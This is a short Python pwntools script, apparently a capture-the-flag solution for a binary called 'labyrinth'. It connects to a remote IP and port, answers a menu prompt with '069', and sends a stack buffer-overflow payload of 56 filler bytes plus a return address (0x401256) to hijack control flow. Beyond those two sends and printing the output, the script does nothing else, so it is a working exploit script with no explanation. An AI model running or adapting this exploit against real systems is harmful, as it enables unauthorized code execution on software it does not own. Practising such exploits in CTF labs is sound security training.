#!/bin/python3

from pwn import *
elf = context.binary = ELF('labyrinth', checksec= False)

io= remote('94.237.63.109', 50774)
io.recvuntil(b">>")

io.sendline(b"069")
#print(io.recvuntil(b">>"))
offset = b'A'*56

add= pack(0x401256)
offset += add
#print(offset) 
io.sendline(offset)
output = io.recvall()
print(output)
io.close()


